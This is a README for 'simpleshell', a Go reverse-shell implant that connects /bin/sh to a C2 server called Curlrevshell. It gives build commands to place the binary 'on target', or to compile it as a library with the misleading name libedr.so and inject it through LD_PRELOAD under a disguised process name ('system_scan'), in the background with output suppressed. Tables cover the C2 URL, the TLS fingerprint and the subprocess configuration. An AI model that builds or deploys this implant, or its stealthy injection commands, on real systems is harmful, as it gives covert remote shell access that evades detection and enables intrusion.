`simpleshell` the Program
=========================
A small program which connects a subprogram and Curlrevshell.  It can also be
built as a shared object file.

Quickstart
----------

### Standalone Program
```sh
go build
# Put it on target
./simpleshell
```

### Injectable Library
```sh
CGO_ENABLED=1 go build -v -trimpath -buildmode c-shared -o libedr.so -ldflags '
    -w -s
    -X main.C2=https://example.com/io
    -X main.Fingerprint=pSUroiq0g92Z3m08n7g/zPQyspRyjm2x/enFRndcdL0=
'
bash -c '
    LD_PRELOAD=./libedr.so \
    exec -a system_scan sleep 86400 &
' </dev/null >&0 2>&1 &
```

Usage
-----
```
Usage: simpleshell [options] [command...]

Simple single-stream implant which connects a command to Curlrevshell.

The command which would be run is

/bin/sh

Options:
  -c2 URL
    	Curlrevshell's URL (default "https://127.0.0.1:4444/io")
  -fingerprint fingerrpint
    	Curlrevshell's TLS fingerrpint
```

Config
------
Configuration comes in three forms: compile-time defaults, environment
variables, and command-line flags.

If a TLS Fingerprint is not given, normal TLS validation is performed.

### Compile-time defaults
These may be set with `-ldflags '-X...'` as in the [Quickstart](#Quickstart)
above.

Variable           | Default                     | Description
-------------------|-----------------------------|------------
`main.Args`        | _none_                      | Subprocess arguments
`main.C2`          | `https://127.0.0.1:4444/io` | Curlrevshell's URL
`main.Fingerprint` | _none_                      | Curlrevshell's TLS Fingerprint

### Environment variables
Config may also be passed via environment variables, which override
compile-time defaults.

Environment Variable | Compile-Time equivalent
---------------------|------------------------
`SIMPLESHELL_ARGS`   | `main.Args`
`SIMPLESHELL_C2`     | `main.C2`
`SIMPLESHELL_FP`     | `main.Fingerprint`

### Command-line options
Config can also be specified on the command-line, when Simpleshell is running
as a standalone binary.  Command-line config overrides environment variables.

Option         | Compile-Time equivalent
---------------|------------------------
_No flag_      | `main.Args`
`-c2`          | `main.C2`
`-fingerprint` | `main.Fingerprint`
